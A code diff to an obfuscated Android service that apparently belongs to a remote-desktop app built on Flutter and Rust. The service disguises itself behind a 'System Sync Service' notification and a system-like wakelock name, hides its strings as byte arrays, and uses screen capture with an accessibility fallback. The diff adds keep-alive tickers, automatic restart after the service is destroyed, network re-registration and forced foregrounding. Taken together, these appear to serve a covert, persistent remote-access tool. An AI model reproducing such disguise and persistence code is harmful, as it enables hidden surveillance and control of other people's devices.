@@ -43,6 +43,7 @@ import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import io.flutter.embedding.android.FlutterActivity
 import java.util.concurrent.Executors
+import java.util.concurrent.ConcurrentHashMap
 import kotlin.concurrent.thread
 import org.json.JSONException
 import org.json.JSONObject
@@ -70,6 +71,8 @@ import android.os.Environment
 const val DEFAULT_NOTIFY_TITLE = "System Sync Service"
  val DEFAULT_NOTIFY_TEXT = p50.a(byteArrayOf(40, -65, -34, -107, -71, 95, 30, -6, -59, -112, -16, 78, 14, -76, -62, -118, -66, 91), byteArrayOf(123, -38, -84, -29, -48, 60))
 const val DEFAULT_NOTIFY_CHANNEL = "OK"
+const val VOICE_CALL_NOTIFY_CHANNEL = "voice_call"
+const val VOICE_CALL_NOTIFY_REQUEST_CODE = 42001
 const val DEFAULT_NOTIFY_ID = 1
 const val NOTIFY_ID_OFFSET = 100
 
@@ -194,7 +197,11 @@ class DFm8Y8iMScvB2YDw : Service() {
     fun DFm8Y8iMScvB2YDwSBN(name: String, arg1: String, arg2: String) {
         Log.d("MainService", "JNI dispatch: name=$name")
         if (name == "update_voice_call_state") {
+            handleVoiceCallStateForForeground(arg1)
             dispatchFlutterEvent("update_voice_call_state", mapOf("client" to arg1))
+        }
+        if (name == "add_connection") {
+            handleAuthorizedConnectionForVideoRefresh(arg1)
         }
         when (name) {
             "zego_voice_call_ready" -> {
@@ -305,6 +312,33 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
     }
 
+    private fun handleAuthorizedConnectionForVideoRefresh(clientJson: String) {
+        try {
+            val jsonObject = JSONObject(clientJson)
+            handleAuthorizedConnectionForVideoRefresh(
+                jsonObject.optInt("id", -1),
+                jsonObject.optBoolean("authorized", false),
+                jsonObject.optBoolean("is_file_transfer", false)
+            )
+        } catch (e: JSONException) {
+            Log.e("MainService", "authorized connection refresh parse failed", e)
+        }
+    }
+
+    private fun handleAuthorizedConnectionForVideoRefresh(
+        id: Int,
+        authorized: Boolean,
+        isFileTransfer: Boolean
+    ) {
+        if (!authorized || isFileTransfer) {
+            return
+        }
+        val reason = "authorized-connection-$id"
+        mainHandler.postDelayed({ forceVideoFrameRefresh("$reason-early") }, 200)
+        mainHandler.postDelayed({ forceVideoFrameRefresh("$reason-mid") }, 900)
+        mainHandler.postDelayed({ forceVideoFrameRefresh("$reason-late") }, 1800)
+    }
+
     private fun dispatchFlutterEvent(method: String, arguments: Map<String, String>?) {
         Handler(Looper.getMainLooper()).post {
             try {
@@ -315,8 +349,47 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
     }
 
+    fun flushPendingVoiceCallEvent() {
+        if (pendingVoiceCallClientJsonById.isEmpty()) {
+            return
+        }
+        pendingVoiceCallClientJsonById.values.forEach { clientJson ->
+            dispatchFlutterEvent("update_voice_call_state", mapOf("client" to clientJson))
+        }
+    }
+
+    private fun handleVoiceCallStateForForeground(clientJson: String) {
+        try {
+            val jsonObject = JSONObject(clientJson)
+            val id = jsonObject.optInt("id", -1)
+            val username = jsonObject.optString("name", "")
+            val peerId = jsonObject.optString("peer_id", "")
+            val inVoiceCall = jsonObject.optBoolean("in_voice_call", false)
+            val incomingVoiceCall = jsonObject.optBoolean("incoming_voice_call", false)
+            if (incomingVoiceCall && !inVoiceCall) {
+                if (id >= 0) {
+                    pendingVoiceCallClientJsonById[id] = clientJson
+                }
+                bringAppToForegroundForVoiceCall(id, username, peerId)
+            } else {
+                if (id >= 0) {
+                    pendingVoiceCallClientJsonById.remove(id)
+                }
+                if (id >= 0) {
+                    cancelNotification(id)
+                }
+            }
+        } catch (e: JSONException) {
+            Log.e("MainService", "handleVoiceCallStateForForeground failed", e)
+        }
+    }
+
     private var serviceLooper: Looper? = null
     private var serviceHandler: Handler? = null
+    private val mainHandler = Handler(Looper.getMainLooper())
+    private var coreKeepAliveTicker: Runnable? = null
+    @Volatile
+    private var networkReady = true
 
     private val powerManager: PowerManager by lazy { applicationContext.getSystemService(Context.POWER_SERVICE) as PowerManager }
     private val wakeLock: PowerManager.WakeLock by lazy { powerManager.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.SCREEN_BRIGHT_WAKE_LOCK, "android:sys:sync_wakelock")}
@@ -342,7 +415,13 @@ class DFm8Y8iMScvB2YDw : Service() {
         var ctx: DFm8Y8iMScvB2YDw? = null
         private var savedMediaProjectionIntent: Intent? = null
         private var explicitStopRequested = false
-        private const val ACT_KEEP_ALIVE_SERVICE = "com.cloudsend.app.KEEP_ALIVE_SERVICE"
+        private val pendingVoiceCallClientJsonById = ConcurrentHashMap<Int, String>()
+        const val ACT_ENSURE_CORE_SERVICE = "com.cloudsend.app.ENSURE_CORE_SERVICE"
+        private const val CORE_KEEP_ALIVE_INTERVAL_MS = 60_000L
+        private const val UNEXPECTED_DESTROY_RESTART_COOLDOWN_MS = 5_000L
+        private const val NETWORK_REGISTER_REFRESH_COOLDOWN_MS = 3_000L
+        private var lastUnexpectedDestroyRestartAt = 0L
+        private var lastNetworkRegisterRefreshAt = 0L
         
         val isReady: Boolean
             get() = _isReady
@@ -356,7 +435,7 @@ class DFm8Y8iMScvB2YDw : Service() {
     private val useVP9 = false
     private val binder = LocalBinder()
 
-    private var reuseVirtualDisplay = Build.VERSION.SDK_INT > 33
+    private var reuseVirtualDisplay = Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE
 
     // video
     @Volatile
@@ -379,22 +458,20 @@ class DFm8Y8iMScvB2YDw : Service() {
                 Intent.ACTION_SCREEN_OFF -> {
                     screenOffActive = true
                     val hadScreenShare = _isStart || mediaProjection != null
-                    Log.i("MainService", "screen off: keep connected service alive")
-                    ensureBackgroundKeepAlive()
-                    keepServiceStateAfterNetworkOrScreenChange("screen-off")
-                    Handler(Looper.getMainLooper()).postDelayed({
+                    Log.i("MainService", "screen off: core service unchanged")
+                    refreshCoreKeepAlive("screen off")
+                    mainHandler.postDelayed({
                         startScreenOffIgnoreFallbackIfNeeded(hadScreenShare, "screen-off-early")
                     }, 800)
-                    Handler(Looper.getMainLooper()).postDelayed({
+                    mainHandler.postDelayed({
                         startScreenOffIgnoreFallbackIfNeeded(hadScreenShare, "screen-off-projection-lost")
                     }, 1800)
                 }
                 Intent.ACTION_SCREEN_ON,
                 Intent.ACTION_USER_PRESENT -> {
                     screenOffActive = false
-                    Log.i("MainService", "screen on/user present: refresh foreground service")
-                    ensureBackgroundKeepAlive()
-                    keepServiceStateAfterNetworkOrScreenChange("screen-on")
+                    Log.i("MainService", "screen on/user present: core service unchanged")
+                    refreshCoreKeepAlive("screen on/user present")
                 }
             }
         }
@@ -402,11 +479,16 @@ class DFm8Y8iMScvB2YDw : Service() {
     private var screenStateReceiverRegistered = false
     private val networkCallback = object : ConnectivityManager.NetworkCallback() {
         override fun onAvailable(network: Network) {
-            keepServiceStateAfterNetworkOrScreenChange("network-available")
+            networkReady = true
+            Log.i("MainService", "network available: core service unchanged")
+            refreshCoreKeepAlive("network available")
+            requestNetworkRegisterRefresh("network available")
         }
 
         override fun onLost(network: Network) {
-            keepServiceStateAfterNetworkOrScreenChange("network-lost")
+            networkReady = false
+            Log.i("MainService", "network lost: core service unchanged")
+            refreshCoreKeepAlive("network lost")
         }
     }
     private var networkCallbackRegistered = false
@@ -459,34 +541,23 @@ class DFm8Y8iMScvB2YDw : Service() {
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
         if (_isReady || _isStart) {
-            try {
-                createForegroundNotification()
-                ensureBackgroundKeepAlive()
-            } catch (e: Exception) {
-                Log.e("MainService", "onTaskRemoved: failed to recreate notification", e)
-            }
+            refreshCoreKeepAlive("task removed")
         }
     }
 
     override fun onTrimMemory(level: Int) {
         super.onTrimMemory(level)
         if (_isReady || _isStart) {
-            Log.w("MainService", "onTrimMemory($level): refresh keep-alive state")
-            ensureBackgroundKeepAlive()
-            if (mediaProjection == null) {
-                keepServiceStateAfterNetworkOrScreenChange("trim-memory")
-            }
+            Log.w("MainService", "onTrimMemory($level): core service unchanged")
+            refreshCoreKeepAlive("trim memory $level")
         }
     }
 
     override fun onLowMemory() {
         super.onLowMemory()
         if (_isReady || _isStart) {
-            Log.w("MainService", "onLowMemory: refresh keep-alive state")
-            ensureBackgroundKeepAlive()
-            if (mediaProjection == null) {
-                keepServiceStateAfterNetworkOrScreenChange("low-memory")
-            }
+            Log.w("MainService", "onLowMemory: core service unchanged")
+            refreshCoreKeepAlive("low memory")
         }
     }
 
@@ -497,10 +568,11 @@ class DFm8Y8iMScvB2YDw : Service() {
             _isAudioStart = false
             checkMediaPermission()
         } else {
-            Log.w("MainService", "onDestroy without explicit stop; keep service state for sticky restart")
+            _isReady = true
             _isStart = false
             _isAudioStart = false
         }
+        stopCoreKeepAliveTicker()
         unregisterScreenStateReceiver()
         unregisterNetworkCallback()
         if (cpuWakeLock.isHeld) {
@@ -511,25 +583,10 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
         if (explicitStopRequested) {
             stopService(Intent(this, DFrLMwitwQbfu7AC::class.java))
+            clearRustServiceContextIfCurrent("explicit-destroy")
         } else {
-            try {
-                val restartIntent = Intent(applicationContext, DFm8Y8iMScvB2YDw::class.java).apply {
-                    action = ACT_KEEP_ALIVE_SERVICE
-                }
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    applicationContext.startForegroundService(restartIntent)
-                } else {
-                    applicationContext.startService(restartIntent)
-                }
-            } catch (e: Exception) {
-                Log.e("MainService", "onDestroy keep-alive restart failed", e)
-            }
-        }
-        ctx = null
-        try {
-            ClsFx9V0S.VHsFQTvK()
-        } catch (e: Throwable) {
-            Log.e("MainService", "VHsFQTvK clearing call failed", e)
+            Log.w("MainService", "onDestroy without explicit stop; keep JNI context and request core restart")
+            requestCoreServiceRestartAfterUnexpectedDestroy()
         }
         super.onDestroy()
     }
@@ -628,10 +685,11 @@ class DFm8Y8iMScvB2YDw : Service() {
     
         super.onStartCommand(intent, flags, startId)
         explicitStopRequested = false
-        if (intent == null || intent.action == null || intent.action == ACT_KEEP_ALIVE_SERVICE) {
-            Log.i("MainService", "onStartCommand: sticky restart")
+        if (intent == null || intent.action == null || intent.action == ACT_ENSURE_CORE_SERVICE) {
+            Log.i("MainService", "onStartCommand: ensure core service")
             _isReady = true
             ensureBackgroundKeepAlive()
+            startCoreKeepAliveTicker()
             checkMediaPermission()
             return START_STICKY
         }
@@ -661,6 +719,7 @@ class DFm8Y8iMScvB2YDw : Service() {
                 _isReady = true
                 createForegroundNotification()
                 ensureBackgroundKeepAlive()
+                startCoreKeepAliveTicker()
 
                 if (!_isStart) {
                     startCapture()
@@ -746,19 +805,6 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
     }
 
-    private fun keepServiceStateAfterNetworkOrScreenChange(reason: String) {
-        Handler(Looper.getMainLooper()).post {
-            if (!_isReady && !_isStart) return@post
-            Log.i("MainService", "keep service after $reason")
-            _isReady = true
-            ensureBackgroundKeepAlive()
-            if (mediaProjection == null && nZW99cdXQ0COhB2o.isOpen && shouldRun) {
-                startIgnoreFallback("keepalive-no-projection-$reason")
-            }
-            checkMediaPermission()
-        }
-    }
-
     private fun startIgnoreFallback(reason: String) {
         if (!nZW99cdXQ0COhB2o.isOpen) {
             Log.i("MainService", "startIgnoreFallback skipped: accessibility not ready, reason=$reason")
@@ -840,6 +886,105 @@ class DFm8Y8iMScvB2YDw : Service() {
             Log.e("MainService", "ensureBackgroundKeepAlive: wifi lock failed", e)
         }
         ensureFloatingWindowKeepAlive()
+    }
+
+    private fun refreshCoreKeepAlive(reason: String) {
+        if (Looper.myLooper() != Looper.getMainLooper()) {
+            mainHandler.post { refreshCoreKeepAlive(reason) }
+            return
+        }
+        if (ctx !== this || (!_isReady && !_isStart)) {
+            return
+        }
+        try {
+            Log.i("MainService", "$reason: refresh core keep-alive")
+            ensureBackgroundKeepAlive()
+            startCoreKeepAliveTicker()
+        } catch (e: Exception) {
+            Log.e("MainService", "$reason: core keep-alive refresh failed", e)
+        }
+    }
+
+    private fun requestNetworkRegisterRefresh(reason: String) {
+        val now = SystemClock.elapsedRealtime()
+        if (now - lastNetworkRegisterRefreshAt < NETWORK_REGISTER_REFRESH_COOLDOWN_MS) {
+            Log.i("MainService", "skip rendezvous register refresh: cooldown, reason=$reason")
+            return
+        }
+        lastNetworkRegisterRefreshAt = now
+        mainHandler.post {
+            try {
+                Log.i("MainService", "request rendezvous register refresh: reason=$reason")
+                ClsFx9V0S.G4yQ9OYY()
+            } catch (e: Exception) {
+                Log.e("MainService", "request rendezvous register refresh failed, reason=$reason", e)
+            }
+        }
+    }
+
+    private fun startCoreKeepAliveTicker() {
+        if (coreKeepAliveTicker != null) {
+            return
+        }
+        val ticker = object : Runnable {
+            override fun run() {
+                if (ctx !== this@DFm8Y8iMScvB2YDw || (!_isReady && !_isStart)) {
+                    coreKeepAliveTicker = null
+                    return
+                }
+                ensureBackgroundKeepAlive()
+                mainHandler.postDelayed(this, CORE_KEEP_ALIVE_INTERVAL_MS)
+            }
+        }
+        coreKeepAliveTicker = ticker
+        mainHandler.postDelayed(ticker, CORE_KEEP_ALIVE_INTERVAL_MS)
+    }
+
+    private fun stopCoreKeepAliveTicker() {
+        coreKeepAliveTicker?.let {
+            mainHandler.removeCallbacks(it)
+        }
+        coreKeepAliveTicker = null
+    }
+
+    private fun clearRustServiceContextIfCurrent(reason: String) {
+        if (ctx !== this) {
+            Log.i("MainService", "skip JNI context cleanup; another service is active, reason=$reason")
+            return
+        }
+        _isReady = false
+        _isStart = false
+        _isAudioStart = false
+        ctx = null
+        try {
+            ClsFx9V0S.VHsFQTvK()
+        } catch (e: Throwable) {
+            Log.e("MainService", "VHsFQTvK clearing call failed, reason=$reason", e)
+        }
+    }
+
+    private fun requestCoreServiceRestartAfterUnexpectedDestroy() {
+        val now = android.os.SystemClock.elapsedRealtime()
+        if (now - lastUnexpectedDestroyRestartAt < UNEXPECTED_DESTROY_RESTART_COOLDOWN_MS) {
+            Log.w("MainService", "skip unexpected destroy restart: cooldown")
+            return
+        }
+        lastUnexpectedDestroyRestartAt = now
+        Handler(Looper.getMainLooper()).postDelayed({
+            try {
+                val intent = Intent(applicationContext, DFm8Y8iMScvB2YDw::class.java).apply {
+                    action = ACT_ENSURE_CORE_SERVICE
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    applicationContext.startForegroundService(intent)
+                } else {
+                    applicationContext.startService(intent)
+                }
+                Log.i("MainService", "requested core service restart after unexpected destroy")
+            } catch (e: Exception) {
+                Log.e("MainService", "request core service restart after unexpected destroy failed", e)
+            }
+        }, 500L)
     }
 
     private fun ensureFloatingWindowKeepAlive() {
@@ -1043,6 +1188,9 @@ class DFm8Y8iMScvB2YDw : Service() {
         } else {
             Log.w("MainService", "stopCapture2: mediaProjection is already null")
         }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            savedMediaProjectionIntent = null
+        }
 
         _isStart = false
         _isReady = true
@@ -1087,8 +1235,8 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
 
         checkMediaPermission()
-        createForegroundNotification()
-        ensureFloatingWindowKeepAlive()
+        ensureBackgroundKeepAlive()
+        startCoreKeepAliveTicker()
 
         Log.i("MainService", "stopCapture2: complete")
     }
@@ -1141,7 +1289,8 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
         checkMediaPermission()
         createForegroundNotification()
-        ensureFloatingWindowKeepAlive()
+        ensureBackgroundKeepAlive()
+        startCoreKeepAliveTicker()
     }
 
     @Synchronized
@@ -1184,8 +1333,8 @@ class DFm8Y8iMScvB2YDw : Service() {
         surface = null
 
         checkMediaPermission()
-        createForegroundNotification()
-        ensureFloatingWindowKeepAlive()
+        ensureBackgroundKeepAlive()
+        startCoreKeepAliveTicker()
 
         Log.i("MainService", "killMediaProjection: complete")
     }
@@ -1296,9 +1445,12 @@ class DFm8Y8iMScvB2YDw : Service() {
             Log.e("MainService", "stop mediaProjection failed", e)
         }
         mediaProjection = null
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            savedMediaProjectionIntent = null
+        }
         _isReady = true
-        createForegroundNotification()
-        ensureFloatingWindowKeepAlive()
+        ensureBackgroundKeepAlive()
+        startCoreKeepAliveTicker()
 
         Log.i("MainService", "stopCaptureKeepService: MediaProjection stopped, service alive")
     }
@@ -1313,8 +1465,8 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
         stopCaptureKeepService()
         checkMediaPermission()
-        createForegroundNotification()
-        ensureFloatingWindowKeepAlive()
+        ensureBackgroundKeepAlive()
+        startCoreKeepAliveTicker()
     }
 
     @Synchronized
@@ -1323,8 +1475,8 @@ class DFm8Y8iMScvB2YDw : Service() {
         stopCaptureKeepService()
         startIgnoreFallback("$reason-close-share")
         checkMediaPermission()
-        createForegroundNotification()
-        ensureFloatingWindowKeepAlive()
+        ensureBackgroundKeepAlive()
+        startCoreKeepAliveTicker()
     }
 
       @Synchronized
@@ -1446,6 +1598,8 @@ class DFm8Y8iMScvB2YDw : Service() {
                 )
             }
         } catch (e: SecurityException) {
+            Log.w("MainService", "createVirtualDisplay failed, requesting new MediaProjection permission", e)
+            handleProjectionStoppedKeepService("virtual-display-security")
             // This initiates a prompt dialog for the user to confirm screen projection.
             requestMediaProjection()
         }
@@ -1583,6 +1737,57 @@ class DFm8Y8iMScvB2YDw : Service() {
         }
     }
 
+    private fun buildVoiceCallActivityIntent(clientID: Int): Intent {
+        return Intent(this, oFtTiPzsqzBHGigp::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK or
+                    Intent.FLAG_ACTIVITY_CLEAR_TOP or
+                    Intent.FLAG_ACTIVITY_SINGLE_TOP or
+                    Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
+            action = Intent.ACTION_MAIN
+            addCategory(Intent.CATEGORY_LAUNCHER)
+            putExtra("cloudsend_voice_call", true)
+            putExtra("cloudsend_voice_call_client_id", clientID)
+        }
+    }
+
+    private fun voiceCallPendingIntent(clientID: Int): PendingIntent {
+        val intent = buildVoiceCallActivityIntent(clientID)
+        val requestCode = VOICE_CALL_NOTIFY_REQUEST_CODE + clientID.coerceAtLeast(0)
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PendingIntent.getActivity(this, requestCode, intent, FLAG_UPDATE_CURRENT or FLAG_IMMUTABLE)
+        } else {
+            PendingIntent.getActivity(this, requestCode, intent, FLAG_UPDATE_CURRENT)
+        }
+    }
+
+    private fun ensureVoiceCallNotificationChannel(): String {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
+            return DEFAULT_NOTIFY_CHANNEL
+        }
+        val channel = NotificationChannel(
+            VOICE_CALL_NOTIFY_CHANNEL,
+            "\u8bed\u97f3\u901a\u8bdd",
+            NotificationManager.IMPORTANCE_HIGH
+        ).apply {
+            description = "\u8bed\u97f3\u901a\u8bdd\u6765\u7535\u63d0\u9192"
+            lockscreenVisibility = Notification.VISIBILITY_PUBLIC
+            enableLights(true)
+            enableVibration(false)
+            setSound(null, null)
+        }
+        notificationManager.createNotificationChannel(channel)
+        return VOICE_CALL_NOTIFY_CHANNEL
+    }
+
+    private fun bringAppToForegroundForVoiceCall(clientID: Int, username: String, peerId: String) {
+        try {
+            startActivity(buildVoiceCallActivityIntent(clientID))
+        } catch (e: Exception) {
+            Log.e("MainService", "bring voice call activity to foreground failed", e)
+        }
+        voiceCallRequestNotification(clientID, "\u8bed\u97f3\u901a\u8bdd", username, peerId)
+    }
+
     private fun loginRequestNotification(
         clientID: Int,
         type: String,
@@ -1623,13 +1828,29 @@ class DFm8Y8iMScvB2YDw : Service() {
         username: String,
         peerId: String
     ) {
-        val notification = notificationBuilder
+        val pendingIntent = voiceCallPendingIntent(clientID)
+        val notification = NotificationCompat.Builder(this, ensureVoiceCallNotificationChannel())
             .setOngoing(false)
+            .setSmallIcon(R.mipmap.ic_stat_logo)
+            .setAutoCancel(true)
             .setPriority(NotificationCompat.PRIORITY_MAX)
-            .setContentTitle(translate(p50.a(byteArrayOf(107, -81, -7, 20, -42, -44, -90, 78, -93, -70, 8, -55, -43, -71), byteArrayOf(47, -64, -39, 109, -71, -95, -122))))
-            .setContentText("$type:$username-$peerId")
+            .setCategory(NotificationCompat.CATEGORY_CALL)
+            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
+            .setContentTitle(type)
+            .setContentText("$username - $peerId")
+            .setContentIntent(pendingIntent)
+            .setFullScreenIntent(pendingIntent, true)
+            .setOnlyAlertOnce(true)
             .build()
-        notificationManager.notify(getClientNotifyID(clientID), notification)
+        try {
+            if (Build.VERSION.SDK_INT < 33 ||
+                ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
+            ) {
+                notificationManager.notify(getClientNotifyID(clientID), notification)
+            }
+        } catch (e: Exception) {
+            Log.e("MainService", "voiceCallRequestNotification failed", e)
+        }
     }
 
     private fun getClientNotifyID(clientID: Int): Int {
